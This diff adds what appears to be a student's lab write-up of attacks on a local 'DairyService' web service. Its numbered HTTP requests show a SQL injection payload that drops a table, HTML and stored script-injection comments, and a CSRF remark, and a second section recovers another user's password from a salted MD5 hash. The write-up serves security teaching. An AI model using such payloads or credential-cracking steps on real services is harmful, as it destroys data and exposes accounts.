@@ -1,0 +1,83 @@
+Network User
+N01
+POST http://localhost:8188/DairyService.svc/register HTTP/1.1
+Host: localhost
+Content-Type: text/html; charset=us-ascii
+Connection: close
+Content-Length: 41
+
+...
+(In the database Credentials table shows the newest register data:)
+User: u335
+Password: u335 (c5a187e8cce9ca285f0b068a13b4f3b1 under the database)
+Scratchpad: who cares'); DROP TABLE Items; -- (the DROP TABLE Items; is the SQL injection)
+...
+
+N02
+POST http://localhost:8188/DairyService.svc/comment?name=ss HTTP/1.1
+Host: localhost
+Content-Type: text/html; charset=us-ascii
+Connection: close
+Content-Length: 16
+
+<h1>Hi</h1> — ss
+(this will ruin the font-size of the comment in the htmlComment table)
+
+
+N03
+POST http://localhost:8188/DairyService.svc/comment?name=11 HTTP/1.1
+Host: localhost
+Content-Type: text/html; charset=us-ascii
+Connection: close
+Content-Length: 344
+
+...
+<img src="http://redsox.uoa.auckland.ac.nz/ds/map.png"> 
+— 11
+(this will inserts an arbitrary image into the UI, the <img> above will change to a real image in the UI)
+...
+
+N04
+POST http://localhost:8188/DairyService.svc/comment?name=script HTTP/1.1
+Host: localhost
+Content-Type: text/html; charset=us-ascii
+Connection: close
+Content-Length: 16
+
+...
+Tell me — script
+(I insert Tell me <script>alert("Yes");</script> into the comment block and then return above's comment as well as alert a message "Yes")
+...
+
+N05
+When a user logged on to a site, this can be tricked to interact with this site to do something the user never intended to do, and cross-site request forgery attack  exploit this behavior to be mounted on the service.
+
+N06
+
+
+Co-Located User
+C01
+magic number of the database: 53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33
+so name of the database management system: SQLite format 3
+
+C02
+I use DB Browser for SQLite to open the database.
+There are 3 tables exist in the database.
+
+C03
+The other user name is tommye.
+
+C04
+salt is "Dairy"
+hashed salted MD5 is be5ce8a293f7c2773c91af4a6623abc4
+password is tommyeword
+
+C05
+GET http://localhost:8188/DairyService.svc/itemimg?id={ID} HTTP/1.1
+Host: localhost
+HTTP/1.1 200 OK
+Content-Type: image/png
+Content-Length: 83103
+
+�PNG
+
